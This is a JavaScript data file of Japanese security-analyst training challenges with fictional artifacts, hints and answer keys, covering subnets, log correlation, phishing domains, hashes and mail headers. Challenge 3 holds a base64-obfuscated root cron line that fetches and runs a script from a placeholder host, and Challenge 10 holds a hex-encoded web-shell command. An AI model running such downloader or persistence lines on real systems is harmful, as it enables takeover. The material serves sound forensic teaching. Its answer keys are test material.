// challenges.js — 実践演習(CHALLENGE)モードの問題データ。NSD.CHALLENGES。
// サジェストなしで解く高難度・実践寄りのアナリスト演習。すべて架空データ。
// 検証ロジックは challenge.js が kind ごとに実装する(このファイルはデータのみ)。
(() => {
  'use strict';
  const NSD = (window.NSD = window.NSD || {});

  // kind: 'choice'(単一) | 'multichoice'(複数) | 'text'(文字列) | 'number'(数値) | 'order'(並べ替え)
  // artifacts[].type: 'kv'(key-value) | 'log'(等幅ログ) | 'code'(等幅ブロック) | 'note'
  NSD.CHALLENGES = [

    // 1) サブネット判定 ---------------------------------------------------
    {
      id: 'cidr-scope', n: 1, diff: 2, cat: 'ネットワーク', week: 3,
      title: '内か、外か — 管理セグメントの境界',
      brief: '踏み台にされたホストが、社内で許可された管理セグメントの内側かを切り分ける。',
      artifacts: [
        { label: '社内ルール', type: 'kv', rows: [
          ['管理用セグメント', '198.51.100.64/27'],
          ['用途', 'この範囲のみ SSH(22) を許可'],
        ] },
        { label: '不審な成功ログイン元', type: 'kv', rows: [
          ['送信元IP', '198.51.100.73'],
        ] },
      ],
      question: '198.51.100.73 は、許可された管理セグメント 198.51.100.64/27 に含まれるか?',
      kind: 'choice',
      options: [
        '含まれる（=許可範囲。内部の正規経路が悪用された可能性が高い）',
        '含まれない（=範囲外。ルール上そもそも通ってはいけない通信）',
      ],
      answer: 0,
      hints: [
        '/27 はホスト部が 32−27 = 5 ビット。ブロックの大きさは 2^5 = 32 個。',
        '198.51.100.64 から始まる 32 個は .64〜.95。73 はこの中?',
      ],
      explain: '/27 のブロックサイズは 32。開始が .64 なので範囲は 198.51.100.64〜.95。73 はこの内側なので「含まれる」。' +
        '許可セグメント内からの不正ログインは、外部からの直接侵入より「内部の正規経路(鍵を持つ者)が乗っ取られた」可能性を示す。CIDRを暗算できると封じ込め範囲の判断が速くなる。',
      ref: 'IPアドレスとサブネット(ネットワーク基礎)',
    },

    // 2) サブネットのホスト数 ---------------------------------------------
    {
      id: 'cidr-hosts', n: 2, diff: 2, cat: 'ネットワーク', week: 3,
      title: '/27 に何台置けるか',
      brief: '隔離するセグメントに、実際いくつのホストが収容され得るかを見積もる。',
      artifacts: [
        { label: '対象セグメント', type: 'kv', rows: [['CIDR', '198.51.100.64/27']] },
      ],
      question: '198.51.100.64/27 で、ホストに割り当て可能なアドレスは何個か?(ネットワークアドレスとブロードキャストを除く)',
      kind: 'number',
      answer: 30, unit: '個', placeholder: '半角数字',
      hints: [
        'ホスト部は 5 ビット。総数は 2^5 = 32。',
        '先頭(ネットワーク)と末尾(ブロードキャスト)の 2 つは使えない。',
      ],
      explain: '2^(32−27) − 2 = 32 − 2 = 30。CIDRの/nから「ブロックサイズ 2^(32−n)」「使えるホストは −2」を即答できると、影響範囲やIPの枯渇(NAT)を素早く見積もれる。',
      ref: 'IPアドレスとサブネット(ネットワーク基礎)',
    },

    // 3) base64 デコードでC2抽出 ------------------------------------------
    {
      id: 'b64-c2', n: 3, diff: 3, cat: 'フォレンジック', week: 9,
      title: '仕込まれた永続化を読む',
      brief: '侵入後に仕掛けられた cron(定期実行)の中身は base64 で難読化されている。デコードして正体を暴く。',
      artifacts: [
        { label: '/etc/cron.d/.sysupd に追記されていた行', type: 'code',
          text: '*/10 * * * * root echo Y3VybCAtcyBodHRwOi8vdXBkYXRlLm5pZ2h0b3dsLmV4YW1wbGUvYi5zaCB8IHNo | base64 -d | sh' },
        { label: 'メモ', type: 'note', text: '10分ごとに root 権限で実行される。echo された文字列が base64 でデコードされ、その結果がシェルに渡っている。' },
      ],
      question: 'base64 部分をデコードした結果、スクリプトを取りに行く先の「ホスト名」を答えよ。',
      kind: 'text',
      accept: ['update.nightowl.example'],
      normalize: { lower: true, stripSpace: true },
      placeholder: '例: xxx.example.com',
      hints: [
        'base64は A–Z a–z 0–9 + / と末尾 = の文字集合。ブラウザなら atob("...") で戻せる。',
        'デコードすると "curl -s http://……/b.sh | sh" の形。http:// の直後がホスト名。',
      ],
      explain: 'デコード結果は curl -s http://update.nightowl.example/b.sh | sh。' +
        '10分ごとにC2から追加スクリプトを取得して実行する典型的な永続化+ダウンローダ。base64は「暗号」ではなく「符号化」なので鍵なしで誰でも戻せる——難読化を剥がすのはアナリストの基本動作。この update.nightowl.example がIOC(侵害の痕跡)になる。',
      ref: 'Miraiとマルウェア/インシデントレスポンス',
    },

    // 4) ログ相関でピボットIP特定 ----------------------------------------
    {
      id: 'pivot-ip', n: 4, diff: 4, cat: 'ログ分析', week: 2,
      title: '2つの名簿に載る一人',
      brief: 'DDoSの発信元一覧と、SSHログイン成功の記録。両方に現れるIPが、攻撃の「踏み台にして侵入もした」本命だ。',
      artifacts: [
        { label: 'DDoS 発信元サンプル(NDR抽出)', type: 'log', lines: [
          '203.0.113.9', '198.18.44.7', '203.0.113.188', '192.0.2.201',
          '198.51.100.244', '203.0.113.77', '198.18.44.132', '192.0.2.55',
        ] },
        { label: 'sshd: Accepted(ログイン成功)', type: 'log', lines: [
          'Accepted password for admin from 10.20.0.5',
          'Accepted publickey for deploy from 198.51.100.20',
          'Accepted password for admin from 203.0.113.188',
          'Accepted password for backup from 10.20.0.9',
        ] },
      ],
      question: 'DDoS発信元とSSHログイン成功の「両方」に現れるIPアドレスは?',
      kind: 'text',
      accept: ['203.0.113.188'],
      normalize: { lower: true, stripSpace: true },
      placeholder: '例: 203.0.113.x',
      hints: [
        '2つのリストの共通集合を探す。片方ずつ指でなぞるより、成功ログインの外部IPを先に絞ると速い。',
        '10.x はプライベート(社内)、198.51.100.20 は自社。残る外部IPをDDoS一覧と突き合わせる。',
      ],
      explain: '203.0.113.188 が両方に出現する。攻撃者は同じ拠点をDDoSの一部にも、ログイン(侵入)にも使っていた——これが「陽動と本命がつながるピボット点」。' +
        'whoisやログを別々に眺めるだけでなく、複数ソースを突き合わせて共通項を見つける相関分析が、点を線にする。',
      ref: 'whois/IPと調査(複数ソースの相関)',
    },

    // 5) なりすましメールの見破り ----------------------------------------
    {
      id: 'phish-sender', n: 5, diff: 3, cat: '脅威分析', week: 12,
      title: 'そっくりさんを見抜く',
      brief: '「多要素認証の再設定」を促すメール4通。正規の差出人はどれも aoba-mfg.example のはず。1通だけ偽物が紛れている。',
      artifacts: [
        { label: '差出人アドレス一覧', type: 'log', lines: [
          '[A] it-support@aoba-mfg.example',
          '[B] security-alerts@aoba-mfg.example',
          '[C] it-support@aoba-rnfg.example',
          '[D] noreply@aoba-mfg.example',
        ] },
        { label: 'ヒント', type: 'note', text: '等幅フォントで見比べること。人間の目は「なんとなく同じ」に見えるところを補完してしまう。' },
      ],
      question: 'なりすまし(偽ドメイン)の差出人はどれか?',
      kind: 'choice',
      options: [
        '[A] it-support@aoba-mfg.example',
        '[B] security-alerts@aoba-mfg.example',
        '[C] it-support@aoba-rnfg.example',
        '[D] noreply@aoba-mfg.example',
      ],
      answer: 2,
      hints: [
        'ドメイン部分(@の後ろ)を1文字ずつ照合する。',
        '"m" と "rn"(r+n)は等幅でもよく似る。aoba-mfg と aoba-rnfg。',
      ],
      explain: '[C] の aoba-rnfg.example は、"m" を "rn"(アール+エヌ)に置き換えたホモグリフ(そっくり文字)の偽ドメイン。' +
        'AiTM/フィッシングはこうした一見同じに見えるドメインで信用させる。ドメインは「なんとなく」でなく末尾から1文字ずつ検証する癖が防御になる。',
      ref: 'AiTM・キルチェーン(AI時代の脅威)',
    },

    // 6) キルチェーンの並べ替え ------------------------------------------
    {
      id: 'killchain-order', n: 6, diff: 4, cat: '脅威分析', week: 12,
      title: '一本の線に並べ直す',
      brief: 'バラバラに記録された6つの出来事を、攻撃の進行(キルチェーン)の順に並べる。',
      artifacts: [
        { label: 'メモ', type: 'note', text: '偵察 → 初期侵入 → 実行/権限 → 永続化 → C2通信 → 目的遂行(持ち出し) の流れを思い出す。' },
      ],
      question: '次の出来事を、攻撃が進んだ順(早い→遅い)に並べ替えよ。',
      kind: 'order',
      options: [
        'cronに永続化を仕込み、再起動後も居座れるようにする',
        '基幹DBから顧客データを外部ストレージへ持ち出し',
        '外部から22/tcpへのスキャンと、既定パスワードの総当たり',
        '外部C2(update.nightowl.example)へ定期的にビーコン送信',
        'デフォルト認証で複合機にログイン成功、初期侵入',
        'Webサーバの脆弱性を突いてWebシェルを設置',
      ],
      order: [2, 4, 5, 0, 3, 1],
      hints: [
        '一番最初は「まだ入っていない」段階=外からの偵察・総当たり。',
        '持ち出し(目的遂行)は必ず最後。永続化とC2は侵入・実行の後、持ち出しの前。',
      ],
      explain: '偵察(スキャン/総当たり)→初期侵入(既定認証でログイン)→実行(Webシェル設置)→永続化(cron)→C2通信(ビーコン)→目的遂行(データ持ち出し)。' +
        'この「点が線でつながる」構造がキルチェーン。1つずつの事象は小さくても、順に並べると一本の攻撃ストーリーとして立ち上がる。',
      ref: 'キルチェーン・多層防御(AI時代の脅威)',
    },

    // 7) IOCハッシュ照合 --------------------------------------------------
    {
      id: 'ioc-hash-match', n: 7, diff: 3, cat: 'フォレンジック', week: 11,
      title: '脅威情報と突き合わせる',
      brief: 'サーバ上のファイルのハッシュを、脅威情報(既知の悪性ハッシュ)の一覧と照合する。一致したものが要隔離。',
      artifacts: [
        { label: 'サーバ上のファイル(MD5)', type: 'log', lines: [
          '[A] /var/www/js/app.js      9b1c4e7a0d3f2c8b1a6e5d4c3b2a1f00',
          '[B] /var/www/js/mainte.js   e5f4254fecc906d658d086643751fb75',
          '[C] /var/www/js/nav.js      e0a4c7d18b2f6b4c9a1e3d5f7c8b0a21',
          '[D] /tmp/.cache/agent       7c9e44b1aa2f0d5e6c3b81f42a0d9e77',
          '[E] /usr/local/bin/updater  3f5a9c2e7b1d4680fa2c6e8b0d13579a',
        ] },
        { label: '脅威情報: 既知の悪性ハッシュ(MD5)', type: 'log', lines: [
          'e5f4254fecc906d658d086643751fb75',
          '7c9e44b1aa2f0d5e6c3b81f42a0d9e77',
          'b16e9a0c4d7f21358e6a0b9c3d5f7180',
        ] },
      ],
      question: '悪性ハッシュ一覧と「一致する」ファイルをすべて選べ。',
      kind: 'multichoice',
      options: [
        '[A] /var/www/js/app.js',
        '[B] /var/www/js/mainte.js',
        '[C] /var/www/js/nav.js',
        '[D] /tmp/.cache/agent',
        '[E] /usr/local/bin/updater',
      ],
      answers: [1, 3],
      hints: [
        'ハッシュは先頭数文字だけでなく末尾まで一致して初めて「同じ」。1文字違えば別物。',
        '悪性リストの3つ目 b16e9a… に一致するファイルは無い。惑わされないこと。',
      ],
      explain: '[B] mainte.js(e5f4254f…)と [D] /tmp/.cache/agent(7c9e44b1…)が悪性リストと完全一致。' +
        '/tmp配下の隠しディレクトリに置かれた実行ファイルは典型的な不審物。ハッシュ照合は「同じファイルか」を1ビットの改変も見逃さず判定できる——改ざん検知とIOC照合の土台。',
      ref: 'ハッシュと改ざんファイルの特定(インシデントレスポンス)',
    },

    // 8) TTLからOS/ホップ推定 --------------------------------------------
    {
      id: 'ttl-os', n: 8, diff: 3, cat: 'ネットワーク', week: 5,
      title: 'TTLは何を語るか',
      brief: 'ping応答のTTL値から、送信元のOS系統と、経由したルータのおおよその数を読む。',
      artifacts: [
        { label: 'ping 応答', type: 'code', text: '64 bytes from 203.0.113.66: icmp_seq=1 ttl=117 time=182.4 ms' },
        { label: 'メモ', type: 'note', text: '初期TTLはOSごとに定番値がある(64=Linux/macOS系、128=Windows系、255=一部機器)。ルータを1つ越えるごとにTTLは1減る。' },
      ],
      question: 'TTL=117 から最も妥当な推定はどれか?',
      kind: 'choice',
      options: [
        '初期TTL 128(Windows系)・経由ルータ 約11',
        '初期TTL 64(Linux系)・経由ルータ 約−53',
        '初期TTL 255・経由ルータ 約138',
        '初期TTL 117・経由ルータ 0(直結)',
      ],
      answer: 0,
      hints: [
        '観測TTLは「初期値より少し小さい」。117 に一番近い定番の初期値は?',
        '128 − 117 = 経由したホップ数。64だと負になってしまう。',
      ],
      explain: '観測TTL 117 に最も近い定番初期値は 128(Windows系)。128 − 117 = 11 で、約11個のルータを越えてきたと読める。' +
        'traceroute を撃たなくても、TTL一発で送信元OSの系統と距離感を推定できる。RTT 182ms の遠さとも整合する。',
      ref: 'TTL・traceroute(経路と到達性)',
    },

    // 9) 持ち出し量の集計 ------------------------------------------------
    {
      id: 'exfil-bytes', n: 9, diff: 4, cat: 'ログ分析', week: 11,
      title: '何が、どれだけ出ていったか',
      brief: 'アクセスログから、攻撃者IPが /export へ送らせた応答バイト数を合計し、持ち出し規模を見積もる。',
      artifacts: [
        { label: 'nginx access.log(抜粋)', type: 'log', lines: [
          '203.0.113.188 - - "GET /export?tbl=customers HTTP/1.1" 200 10485760',
          '10.20.0.5 - - "GET /health HTTP/1.1" 200 12',
          '203.0.113.188 - - "GET /export?tbl=orders HTTP/1.1" 200 5242880',
          '198.51.100.20 - - "GET /index.html HTTP/1.1" 200 4096',
          '203.0.113.188 - - "GET /export?tbl=payments HTTP/1.1" 200 20971520',
          '203.0.113.188 - - "GET /export?tbl=empty HTTP/1.1" 404 0',
        ] },
        { label: 'メモ', type: 'note', text: '行末の数字が応答ボディのバイト数。ステータス200で実際に送られたものだけを数える。' },
      ],
      question: '攻撃者IP 203.0.113.188 が「200で持ち出したバイト数」の合計は?(単位: バイト)',
      kind: 'number',
      answer: 36700160, unit: 'バイト', placeholder: '半角数字(バイト)',
      hints: [
        '203.0.113.188 かつ ステータス 200 の行だけを足す。404(0バイト)は持ち出せていない。',
        '10485760 + 5242880 + 20971520。ちなみに 1MB = 1048576 バイト。',
      ],
      explain: '10,485,760 + 5,242,880 + 20,971,520 = 36,700,160 バイト(= 35 MB)。' +
        '404の行は0バイトなので加えない。「誰が・何を・どれだけ」をログから定量化するのは、インシデント報告(被害範囲の確定)の核心。customers/orders/payments が抜かれた事実も同時に読み取れる。',
      ref: 'ログ調査とインシデント報告(被害範囲の定量化)',
    },

    // 10) 16進デコードでWebシェルのコマンド --------------------------------
    {
      id: 'hex-decode', n: 10, diff: 3, cat: 'フォレンジック', week: 11,
      title: 'Webシェルの一撃目',
      brief: 'アクセスログに残ったWebシェルの cmd パラメータは16進で符号化されている。デコードして攻撃者の最初の行動を読む。',
      artifacts: [
        { label: 'access.log の疑わしい1行', type: 'code',
          text: 'POST /js/mainte.js?cmd=77686f616d693b206964 HTTP/1.1  200' },
        { label: 'メモ', type: 'note', text: '16進(hex)は 1 バイト = 2 文字。2文字ずつ区切って文字コードに戻す。' },
      ],
      question: 'cmd の16進値をデコードすると、攻撃者が最初に実行した確認コマンドは?',
      kind: 'text',
      accept: ['whoami; id', 'whoami;id', 'whoami id'],
      normalize: { lower: true, stripSpace: true },
      placeholder: '例: コマンド文字列',
      hints: [
        '77=w, 68=h, 6f=o … 2文字ずつASCIIに戻す。',
        '"whoami" と "id" ——自分が誰で、どんな権限かを最初に確かめる典型的な初動。',
      ],
      explain: '77686f616d693b206964 → "whoami; id"。侵入直後にまず「自分は誰で、どのグループ/権限か」を確認するのは攻撃者の常套。' +
        '16進符号化も base64 と同じく鍵のいらない難読化なので、その場でデコードして意図を読むのがフォレンジックの基本。',
      ref: 'Webシェル・難読化とログ調査(インシデントレスポンス)',
    },

    // 11) メール認証(SPF/DKIM/DMARC) -------------------------------------
    {
      id: 'mail-auth', n: 11, diff: 4, cat: '脅威分析', week: 12,
      title: 'ヘッダは嘘をつけない',
      brief: '「至急送金してほしい」というメールのヘッダから、本物か なりすましかを判定する。',
      artifacts: [
        { label: '受信メールのヘッダ(抜粋)', type: 'code',
          text: 'From: 財務部長 <cfo@aoba-mfg.example>\nReceived-SPF: fail (sender IP is 203.0.113.240)\nDKIM-Signature: (none)\nAuthentication-Results: dmarc=fail (p=reject) header.from=aoba-mfg.example' },
        { label: 'メモ', type: 'note', text: 'SPF=送信元IPが正規か / DKIM=改ざん・正規署名か / DMARC=SPF・DKIMの結果に基づく最終方針。' },
      ],
      question: 'このヘッダから最も妥当な結論は?',
      kind: 'choice',
      options: [
        '差出人を詐称した なりすましメール(SPF fail・DKIM 署名なし・DMARC fail)。指示に従ってはいけない',
        '正規の社内メール。SPFがfailでも本文が日本語なら安全',
        'DKIMが無いだけで、SPFが通っているので問題ない',
        'ヘッダだけでは何も判断できない',
      ],
      answer: 0,
      hints: [
        'SPF/DKIM/DMARC の3つが「揃って」何を示しているかを見る。',
        'DMARC の p=reject は「認証に失敗したら拒否せよ」という正規ドメイン側の方針。それが fail している。',
      ],
      explain: 'SPF fail(送信元IPが正規リストにない)・DKIM 署名なし・DMARC fail(p=reject)——3つとも「正規の aoba-mfg.example から送られていない」ことを示す。' +
        '表示名(財務部長)や日本語の自然さは詐称し放題。BEC(ビジネスメール詐欺)/AiTMは、本文でなくヘッダの認証結果で見抜く。',
      ref: 'AiTM・なりすまし対策(AI時代の脅威)',
    },

    // 12) タイムゾーン相関 -----------------------------------------------
    {
      id: 'log-timezone', n: 12, diff: 5, cat: 'ログ分析', week: 8,
      title: 'その時刻、日本では何時',
      brief: '海外拠点のWAFログはUTC。SOCの運用時刻(日本時間)に直して、社内の他ログと時系列を合わせる。',
      artifacts: [
        { label: 'WAF ログ(タイムゾーン=UTC)', type: 'code',
          text: '2026-07-04T18:43:12Z  BLOCK  sqli attempt  src=203.0.113.66  uri=/login' },
        { label: 'メモ', type: 'note', text: '末尾の Z は UTC(協定世界時)。日本標準時(JST)は UTC+9。24時を超えたら日付が翌日に繰り上がる。' },
      ],
      question: 'この 18:43(UTC)は、日本時間(JST)では何時何分か?(HH:MM 形式)',
      kind: 'text',
      accept: ['03:43', '3:43', '03:43 (翌日)', '午前3時43分'],
      normalize: { lower: true, stripSpace: true },
      placeholder: '例: 09:30',
      hints: [
        'JST = UTC + 9 時間。18:43 に 9 時間を足す。',
        '18 + 9 = 27 → 27 − 24 = 3。日付は翌日に繰り上がる。',
      ],
      explain: '18:43 UTC + 9h = 27:43 → 翌日 03:43 JST。' +
        '複数拠点・複数機器のログはタイムゾーンがバラバラ。UTCに揃える(またはJSTに直す)で時系列がつながり、「同じ攻撃の別の断面」だと分かる。03:43という時刻は、深夜のインシデントとして他ログとも符合する。',
      ref: '時刻・時系列の扱い(未来予測/ログ相関)',
    },

  ];
})();
